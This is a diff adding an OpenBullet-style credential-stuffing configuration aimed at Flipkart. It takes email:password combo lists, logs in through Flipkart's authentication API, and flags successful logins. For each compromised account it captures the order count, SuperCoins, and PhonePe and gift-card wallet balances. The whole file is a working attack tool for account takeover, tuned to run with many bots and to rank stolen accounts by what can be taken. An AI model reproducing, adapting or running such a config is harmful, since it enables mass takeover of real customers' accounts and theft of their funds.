@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "Flipkart",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-11T11:27:21.8326827-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#request_cookies REQUEST GET "https://www.flipkart.com" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+
+#login REQUEST POST "https://www.flipkart.com/api/4/user/authenticate" 
+  CONTENT "{\"loginId\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "X-user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) FKUA/website/41/website/Desktop" 
+
+#key_check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "authentication successful" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+
+#get_orders REQUEST GET "https://www.flipkart.com/api/3/self-serve/orders" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "X-user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) FKUA/website/41/website/Desktop" 
+
+#count_orders FUNCTION CountOccurrences "orderId" "<SOURCE>" -> CAP "Orders" 
+
+#get_coins REQUEST POST "https://www.flipkart.com/api/4/page/fetch" 
+  CONTENT "{\"pageUri\":\"/plus/coins-activity\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "X-user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) FKUA/website/41/website/Desktop" 
+
+#parse_coins PARSE "<SOURCE>" LR "\"text\":{\"type\":\"RichTextValue\",\"text\":\"" "\"" -> CAP "Coins" 
+
+#get_balances REQUEST GET "https://www.flipkart.com/api/2/wallet/balance" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "X-user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) FKUA/website/41/website/Desktop" 
+
+#create_holder-list UTILITY List "holder" Create -> VAR "holder" 
+
+#add_to_holder UTILITY List "holder" Add "PhonePE: " "0" 
+
+#add_to_holder UTILITY List "holder" Add "Gift Cards: " "1" 
+
+#parse_balances PARSE "<SOURCE>" JSON "availableBalance" Recursive=TRUE -> VAR "balances" 
+
+#rmv_first_entry_in_balances UTILITY List "balances" Remove "0" 
+
+#zip_balances_into_holder UTILITY List "holder" Zip "balances" -> CAP "Balances" 
+
